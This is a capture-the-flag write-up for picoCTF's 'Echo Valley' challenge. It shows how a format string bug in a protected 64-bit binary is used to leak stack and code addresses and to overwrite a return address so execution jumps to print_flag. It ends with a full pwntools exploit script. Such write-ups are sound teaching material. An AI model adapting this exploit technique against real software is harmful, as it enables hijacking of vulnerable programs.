# Description

The echo valley is a simple function that echoes back whatever you say to it.But how do you make it respond with something more interesting, like a flag?Download the source: [valley.c](https://challenge-files.picoctf.net/c_shape_facility/3540df5468ae2357d00a7a3e2d396e6522b24f7a363cbaff8badcb270d186bda/valley.c)Download the binary: [valley](https://challenge-files.picoctf.net/c_shape_facility/3540df5468ae2357d00a7a3e2d396e6522b24f7a363cbaff8badcb270d186bda/valley)

Additional details will be available after launching your challenge instance.

# Solution

Reviewing the code for this one it seems we are dealing with a format string vulnerability, however this will require a series of steps to gain RCE since this binary is fortified with some protections like stack canary, pic, relro and NX.

```c
printf("You heard in the distance: ");
printf(buf);
```

Since we are inside an infinite loop, we can have unlimited arbitrary reads and writes, and the plan will be something similar to:

1. Get a leak to bypass ASLR
2. Calculate the real address of print_flag
3. Overwrite something to get RCE and redirect execution to print_flag

## Getting a reliable leak

First as explained in PIE Time 2 we can use a string format vulnerability to get an arbitrary read from memory, after debugging the binary we noticed that in position 21 we get a leak to a return address in the stack.

![Pasted image 20250307144913.png](./attachments/Pasted%20image%2020250307144913.png)

This matches the address for main+18.

![Pasted image 20250307144929.png](./attachments/Pasted%20image%2020250307144929.png)

We send a string format with that position using the shouting function and judging by the 12 LSB we are getting the same offset.

![Pasted image 20250307145038.png](./attachments/Pasted%20image%2020250307145038.png)

## Calculating the real address of print_flag

Now that we have a leak we just need to know the offset of main we are getting as a return address, according to radare2 this is at offset 0x1413.

![Pasted image 20250307145240.png](./attachments/Pasted%20image%2020250307145240.png)

We can calculate the base address for the valley binary and get the address of the print_flag function by adding its offset.

![Pasted image 20250307145356.png](./attachments/Pasted%20image%2020250307145356.png)

## Arbitrary write to gain code execution
One neat thing about format string vulnerabilities is that you can also perform arbitrary writes anywhere in memory (of course taking into consideration NX). Now that we have a foothold, we can start looking for feasible addresses to overwrite to gain RCE, one of the obvious ones is to use the GOT and PLT tables, unfortunately this binary was built with full RELRO meaning that the GOT table is ready only. 

Since that is not possible we are going to try to overwrite a return address in the stack directly, this however posses another challenge: we don't know the address range of the stack ... yet!

Checking the stack during execution time in GDB reveals something similar to the following layout.

![Pasted image 20250307170124.png](./attachments/Pasted%20image%2020250307170124.png)

It seems we leak several addresses of the stack but the one we are interested is the one before our return address at 0x7ff3ac7e08, this return address if followed by a value 0x2 in the stack, we were able to replicate the same behavior in a second execution ...

![Pasted image 20250307170945.png](./attachments/Pasted%20image%2020250307170945.png)

We use the same technique as our first step and discover that a stack address is leaked in position 20.

![Pasted image 20250307171004.png](./attachments/Pasted%20image%2020250307171004.png)

Now we almost have all the pieces we need to gain code execution, one thing we still need to sort out is the limited buffer of just 100 chars, this means we can't write big values such as the one required for 64 bits since printf uses the total number of bytes printed.

To get around this we are going to overwrite 2 bytes at a time, in the next image we see the return address changed to print_flag.


![Pasted image 20250307183234.png](./attachments/Pasted%20image%2020250307183234.png)

Once we redirect execution we are able to get the flag ...

![Pasted image 20250307183601.png](./attachments/Pasted%20image%2020250307183601.png)

Full py script ...

```python
#!/usr/bin/python
# -*- coding: latin-1 -*-

from pwn import *
import sys

def send_payload(payload):
    r.sendline(payload)
    return r.recvall()

def hunt():
  r.recvuntil(b'Welcome to the Echo Valley, Try Shouting: \n')
  r.sendline("%21$p") #25
  r.recvuntil(b'You heard in the distance: ')
  leak = r.recvline().decode().rstrip('\n')
  win_offset = int(leak,16)-0x1aa
  last_bytes = win_offset & 0xffff
  print('{:#x}'.format(win_offset))
  print('{:#x}'.format(last_bytes))
  r.sendline("%20$p") #25
  r.recvuntil(b'You heard in the distance: ')
  leak = r.recvline().decode().rstrip('\n')
  stack_leak = int(leak,16)-0x8
  print('{:#x}'.format(stack_leak))
  context.clear(arch = 'amd64')
  payload = fmtstr_payload(6, {stack_leak: last_bytes}, write_size='byte')
  r.sendline(payload)
  win_offset = win_offset >> 16
  print('{:#x}'.format(win_offset))
  last_bytes = win_offset & 0xffff
  print('{:#x}'.format(last_bytes))
  payload = fmtstr_payload(6, {stack_leak+0x2: last_bytes}, write_size='byte')
  r.sendline(payload)
  win_offset = win_offset >> 16
  print('{:#x}'.format(win_offset))
  last_bytes = win_offset & 0xffff
  print('{:#x}'.format(last_bytes))
  payload = fmtstr_payload(6, {stack_leak+0x4: last_bytes}, write_size='byte')
  r.sendline(payload)

if __name__ == '__main__':
  context.terminal = ['tmux','splitw','-v']

  binary="./valley"
  host, port = "localhost 50959".split()

  if len(sys.argv) > 1:
    r = remote(host,int(port))
  else:
    log.info("For remote: %s remote" % sys.argv[0])
    r = gdb.debug([binary,b'AAAAAAAA'],gdbscript=script, env={"LD_PRELOAD":""})
  hunt()
  ```
  
